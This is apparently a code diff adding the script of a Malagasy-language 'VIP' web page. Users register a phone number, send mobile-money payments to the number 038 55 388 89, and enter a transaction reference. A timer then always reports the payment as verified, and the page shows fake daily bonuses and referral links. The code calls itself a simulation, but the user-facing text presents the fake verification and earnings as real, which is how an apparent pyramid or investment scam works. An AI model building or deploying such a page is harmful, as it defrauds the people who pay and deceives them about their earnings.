+            document.getElementById('user-display-phone').innerText = phone;
+
+            showNotification("Tafiditra soa aman-tsara ny fisoratana anarana!", "success");
+            switchStep('step-payment');
+        }
+
+        // Step 2: Payment Reference Verification Handler
+        function handlePaymentSubmit(e) {
+            e.preventDefault();
+            const ref = document.getElementById('ref-input').value.trim();
+
+            if (!ref) {
+                showNotification("Azafady ampidiro ny laharana Reference!", "error");
+                return;
+            }
+
+            state.transactionRef = ref;
+            saveState();
+
+            // Launch Modal Simulator
+            const modal = document.getElementById('status-modal');
+            const spinner = document.getElementById('modal-spinner');
+            const successIcon = document.getElementById('modal-success-icon');
+            const title = document.getElementById('modal-title');
+            const desc = document.getElementById('modal-desc');
+            const btn = document.getElementById('modal-btn');
+            const refCode = document.getElementById('modal-ref-code');
+
+            refCode.innerText = ref;
+            spinner.classList.remove('hidden');
+            successIcon.classList.add('hidden');
+            btn.classList.add('hidden');
+            title.innerText = "Eo am-panamarinana...";
+            desc.innerHTML = `Jerena ao amin'ny rafitra ny reference <span class="text-neonGold font-mono font-bold">${ref}</span>.`;
+
+            modal.classList.remove('hidden');
+
+            // Simulate Network Check Delay
+            setTimeout(() => {
+                spinner.classList.add('hidden');
+                successIcon.classList.remove('hidden');
+                title.innerText = "Voamaina Soa Aman-tsara!";
+                desc.innerHTML = `Ny fandoavam-bola <strong>1 200 Ar</strong> amin'ny reference <span class="text-neonGreen font-mono font-bold">${ref}</span> dia voamafy! Actif ny VIP1-nao.`;
+                btn.classList.remove('hidden');
+                playSuccessSound();
+            }, 2500);
+        }
+
+        function closeModalAndProceed() {
+            document.getElementById('status-modal').classList.add('hidden');
+            updateDashboardUI();
+            switchStep('step-dashboard');
+            showNotification("Tonga eto amin'ny Dashboard VIP ianao!", "success");
+        }
+
+        // Step 3: Dashboard Functions
+        function updateDashboardUI() {
+            document.getElementById('dash-user-phone').innerText = state.registeredPhone || '038 55 388 89';
+            document.getElementById('dash-user-ref').innerText = state.transactionRef || 'TXN-88902';
+            document.getElementById('stat-balance').innerText = state.balance.toLocaleString('fr-FR');
+            document.getElementById('stat-referrals').innerText = state.referralCount;
+            document.getElementById('ref-link-input').value = `https://hpuvip01.github.io/ref?user=${encodeURIComponent(state.registeredPhone || 'vip')}`;
+        }
+
+        function claimDailyBonus() {
+            if (state.claimedToday) {
+                showNotification("Efa voaray ny bonus androany! Miverena rahampitso.", "info");
+                return;
+            }
+
+            state.balance += 300;
+            state.claimedToday = true;
+            saveState();
+
+            updateDashboardUI();
+            playSuccessSound();
+
+            const btn = document.getElementById('btn-claim');
+            btn.className = "w-full md:w-auto py-2.5 px-5 bg-slate-800 text-slate-500 font-bold rounded-xl text-xs font-tech tracking-wider cursor-not-allowed flex items-center justify-center gap-2";
+            btn.innerHTML = `<i class="fa-solid fa-check text-neonGreen"></i> <span>EFA VOARAY NY BONUS ANDROANY</span>`;
+
+            showNotification("Nampiana +300 Ar ny solonao!", "success");
+        }
+
+        function upgradeVIP(pkgName, price) {
+            playBeep(700, 'triangle', 0.2);
+            showNotification(`Mila mandefa ${price} amin'ny laharana 038 55 388 89 ianao mba hidirana amin'ny ${pkgName}.`, "info");
+        }
+
+        function copyReferralLink() {
+            const copyText = document.getElementById("ref-link-input");
+            copyText.select();
+            document.execCommand("copy");
+            playBeep(800, 'sine', 0.1);
+            showNotification("Kopiavo soa aman-tsara ny rohy fanasana!", "success");
+        }
+
+        function copyToClipboard(text) {
+            const dummy = document.createElement("textarea");
+            document.body.appendChild(dummy);
+            dummy.value = text;
+            dummy.select();
+            document.execCommand("copy");
+            document.body.removeChild(dummy);
+            playBeep(800, 'sine', 0.1);
+            showNotification(`Kopiavo ny laharana: ${text}`, "success");
+        }
+
+        function resetSimulation() {
+            if (confirm("Tia hamerina ny simulation amin'ny voalohany tokoa ve ianao?")) {
+                localStorage.removeItem('hpu_vip_state');
+                location.reload();
+            }
+        }
+
+        // Custom Notification Toast
+        function showNotification(msg, type = "info") {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+
+            let borderColor = "border-neonCyan";
+            let icon = "fa-circle-info text-neonCyan";
+
+            if (type === "success") {
+                borderColor = "border-neonGreen";
+                icon = "fa-circle-check text-neonGreen";
+            } else if (type === "error") {
+                borderColor = "border-neonMagenta";
+                icon = "fa-circle-xmark text-neonMagenta";
+            }
+
+            toast.className = `glass-panel border ${borderColor} p-3 rounded-xl shadow-lg flex items-center gap-3 text-xs text-white transform translate-x-full transition-all duration-300 pointer-events-auto`;
+            toast.innerHTML = `
+                <i class="fa-solid ${icon} text-base"></i>
+                <span class="flex-grow font-medium">${msg}</span>
+            `;
+
+            container.appendChild(toast);
+
+            // Animate In
+            setTimeout(() => {
+                toast.classList.remove('translate-x-full');
+            }, 10);
+
+            // Remove after 3.5s
+            setTimeout(() => {
+                toast.classList.add('translate-x-full');
+                setTimeout(() => {
+                    if (toast.parentNode) toast.parentNode.removeChild(toast);
+                }, 300);
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
